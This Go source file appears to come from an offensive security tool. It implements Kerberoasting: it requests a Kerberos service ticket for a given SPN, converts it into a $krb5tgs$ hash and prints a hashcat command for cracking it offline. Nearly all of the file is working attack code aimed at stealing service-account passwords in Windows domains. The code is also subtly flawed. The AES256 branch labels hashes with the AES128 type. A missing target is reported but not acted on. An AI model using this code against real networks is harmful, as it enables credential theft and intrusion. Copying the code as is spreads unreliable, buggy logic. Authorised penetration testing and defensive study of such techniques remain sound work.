// MIT License
//
// # Copyright (c) 2025 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/jfjallid/gokrb5/v8/iana/etypeID"
	"github.com/jfjallid/gokrb5/v8/messages"
)

var helpKerberoastOptions = `
    Usage: ` + os.Args[0] + ` --kerberoast [options]
    ` + helpConnectionOptions + `
    options:
          --spn	<SPN>             SPN used to request or forge a service ticket of format "service/FQDN"
          --target <username>     Target username to request service ticket for
          --krb5-conf <file>      Read krb5.conf file and use as config
          --request-rc4           Ask for RC4 encrypted encPart of KDC REP, not the actual ticket (default false)
`

func handleKerberoast(args *userArgs) (err error) {
	if args.targetUsername == "" {
		fmt.Printf("Must specify a --target username for the --spn")
		myFlags.Usage()
	}
	st, _, err := args.c.GetServiceTicket(args.spn)
	if err != nil {
		log.Errorln(err)
		return
	}

	h, err := extractHashFromST(st, args.targetUsername)
	if err != nil {
		log.Errorln(err)
		return
	}

	//TODO improve output
	fmt.Printf("%s\n", h)
	fmt.Println("Crack with hashcat -m 13100 <hash.txt> <wordlist.txt>")

	return
}

func extractHashFromST(st messages.Ticket, user string) (hash string, err error) {
	sb := strings.Builder{}

	sb.Write([]byte("$krb5tgs$"))
	if st.EncPart.EType == etypeID.RC4_HMAC {
		sb.Write([]byte(strconv.Itoa(int(etypeID.RC4_HMAC)) + "$*"))
		sb.Write([]byte(user + "$" + st.Realm + "$"))
		sb.Write([]byte(strings.ReplaceAll(st.SName.PrincipalNameString(), ":", "~") + "*$"))
		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[:16]) + "$"))
		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[16:])))
	} else if st.EncPart.EType == etypeID.AES128_CTS_HMAC_SHA1_96 {
		length := len(st.EncPart.Cipher)
		sb.Write([]byte(strconv.Itoa(int(etypeID.AES128_CTS_HMAC_SHA1_96)) + "$"))
		sb.Write([]byte(user + "$" + st.Realm + "$*"))
		sb.Write([]byte(strings.ReplaceAll(st.SName.PrincipalNameString(), ":", "~") + "*$"))
		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[length-12:]) + "$"))
		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[:length-12])))
	} else if st.EncPart.EType == etypeID.AES256_CTS_HMAC_SHA1_96 {
		length := len(st.EncPart.Cipher)
		sb.Write([]byte(strconv.Itoa(int(etypeID.AES128_CTS_HMAC_SHA1_96)) + "$"))
		sb.Write([]byte(user + "$" + st.Realm + "$*"))
		sb.Write([]byte(strings.ReplaceAll(st.SName.PrincipalNameString(), ":", "~") + "*$"))
		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[length-12:]) + "$"))
		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[:length-12])))
	} else {
		err = fmt.Errorf("Haven't implemented parsing for encryption type: %d", st.EncPart.EType)
		return
	}
	hash = sb.String()
	return
}
